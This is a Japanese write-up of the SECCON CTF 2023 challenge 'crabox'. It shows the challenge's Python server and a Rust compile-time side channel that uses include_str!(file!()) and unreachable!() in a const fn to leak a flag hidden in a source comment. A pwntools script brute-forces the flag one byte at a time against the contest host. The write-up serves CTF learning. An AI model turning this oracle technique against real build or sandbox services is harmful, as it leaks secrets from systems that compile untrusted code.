【SECCON CTF 2023】crabox


sandbox問の中のwarmup。reversingで詰まってしまったので息抜きに着手。

問題

問題のファイルをダウンロードすると以下のpythonスクリプトが入っている。
中身を見てみるとpythonでrustのソースコードを入力値から作成したものをrustcでコンパイルしている。
そのコンパイルが正常終了したかどうかという結果のみを返答するというものになっていて、実際にコンパイルした実行ファイルが実行されることはない。

# app.py
import sys
import re
import os
import subprocess
import tempfile

FLAG = os.environ["FLAG"]
assert re.fullmatch(r"SECCON{[_a-z0-9]+}", FLAG)
os.environ.pop("FLAG")

TEMPLATE = """
fn main() {
    {{YOUR_PROGRAM}}

    /* Steal me: {{FLAG}} */
}
""".strip()

print("""
🦀 Compile-Time Sandbox Escape 🦀

Input your program (the last line must start with __EOF__):
""".strip(), flush=True)

program = ""
while True:
    line = sys.stdin.readline()
    if line.startswith("__EOF__"):
        break
    program += line
if len(program) > 512:
    print("Your program is too long. Bye👋".strip())
    exit(1)

source = TEMPLATE.replace("{{FLAG}}", FLAG).replace("{{YOUR_PROGRAM}}", program)

with tempfile.NamedTemporaryFile(suffix=".rs") as file:
    file.write(source.encode())
    file.flush()

    try:
        proc = subprocess.run(
            ["rustc", file.name],
            cwd="/tmp",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2,
        )
        print(":)" if proc.returncode == 0 else ":(")
    except subprocess.TimeoutExpired:
        print("timeout")

フラグは動的に作成されるrustのソースコードのコメント部分にのみ書かれているため、以下のようにmacroを作成して入力に入れようとしても認識してくれない。

fn main() {
}
macro_rules! a {
    ($t:tt) => { /* 何かしらの処理 */}
}

a!{
    /* Steal me: SECCON{hoge_huga_piyo} */
}

そのため、ファイルの中身を文字列として見る必要があるため、rustのビルトインマクロのfile![1]とinclude_str![2]を利用する。それぞれ、ファイルへのパスを取得するマクロと、与えられたパスのファイルの中身を読み込んで文字列として展開するマクロとなっている。

あとは文字列の中身をコンパイル時に判定して処理が変更されるようなものを書けばよい。
以下のようにconstでコンパイル時に評価されるように関数を書いておき、include_str!で取得した文字列からコメントの部分のコードを比較し、値によってunreachable![3]にたどり着くようにすれば、到達しないはずの部分に確実に到達するということでコンパイル時にエラーが発生することを利用し、ファイル内の文字を1文字ずつ判定することができる。

fn main() {
    println!("{}", C);
}

const C: u8 = b(include_str!(file!()));

const fn b(x: &str) -> u8{
    if x.as_bytes()[196] == 123 {
    unreachable!();
    };
    1
    /* Steal me: SECCON{hoge_huga_piyo} */
}

解法

ここまでわかれば後は一文字ずつ確認していけばよいのでpythonでpwntoolsでも利用して自動で確認してしまう。

# solve.py
from pwn import *

# 送るソースコード
payload = """println!("{{}}", C);
}}
const C:u8=b(include_str!(file!()));
const fn b(x:&str)->u8{{if
x.as_bytes()[{i:3d}]=={c:3d}{{unreachable!();}};1
__EOF__
"""

# flagに利用されうる文字を準備
cs = list(range(ord("a"), ord("z")+1)) + list(range(ord("0"), ord("9")+1)) + [ord("_")]

flag = ["SECCON{"]

# 文字数を数えたところ168文字目からがフラグの中身だったため、
# 168文字目以降の文字列を1文字ずつ求める。
for i in range(168, 168+0x30):
    end = False
    for c in cs:
        io = remote("crabox.seccon.games", 1337)
        io.send(payload.format(i=i, c=c).encode())
        if io.recvall()[-2] == ord("("):
            flag.append(chr(c))
            end = True
            break
    if not end:
        break
flag.append("}")

print("".join(flag))
